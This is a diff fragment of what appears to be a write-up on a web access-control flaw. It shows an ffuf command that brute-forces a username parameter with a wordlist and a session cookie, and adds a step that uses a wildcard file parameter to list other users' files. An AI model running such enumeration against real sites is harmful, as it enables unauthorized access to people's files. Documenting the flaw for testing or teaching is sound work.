@@ -9,3 +9,6 @@ then you could brute to see who can actually access this file. There is two ways
   b) ffuf (fast)
      ffuf -u 'http://example/view.php?username=FUZZ&file=test.xlsx' -w names.txt -mc 200 -fr "User not found." -H "Cookie: PHPSESSID=your_cookie_here"
 and you should get all the usernames that can access this file (admins, moderators and maybe some other users too)
+
+and then you can just do :  http://<example>/view.php?username=<the name you found>&file=*.pdf  to see what other files they have
+
